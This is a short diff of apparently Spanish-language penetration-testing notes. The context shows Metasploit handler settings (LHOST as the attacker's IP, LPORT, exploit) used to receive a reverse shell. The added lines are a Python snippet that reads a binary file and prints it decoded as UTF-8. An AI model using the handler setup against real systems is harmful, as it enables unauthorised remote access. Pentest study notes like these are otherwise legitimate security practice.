@@ -33,3 +33,19 @@ set LHOST <dirección IP del atacante>
 set LPORT <puerto local>
 set ExitFunc process
 exploit
+
+# script pass sh 
+import codecs
+
+# Ruta del archivo binario
+ruta_archivo_binario = '/ruta/al/archivo.bin'
+
+# Abrir el archivo binario en modo lectura y especificar el encoding como 'utf-8'
+with codecs.open(ruta_archivo_binario, 'rb') as archivo_binario:
+    contenido_binario = archivo_binario.read()
+
+# Convertir el contenido binario a una cadena de caracteres UTF-8
+contenido_utf8 = contenido_binario.decode('utf-8')
+
+# Imprimir el contenido UTF-8
+print(contenido_utf8)
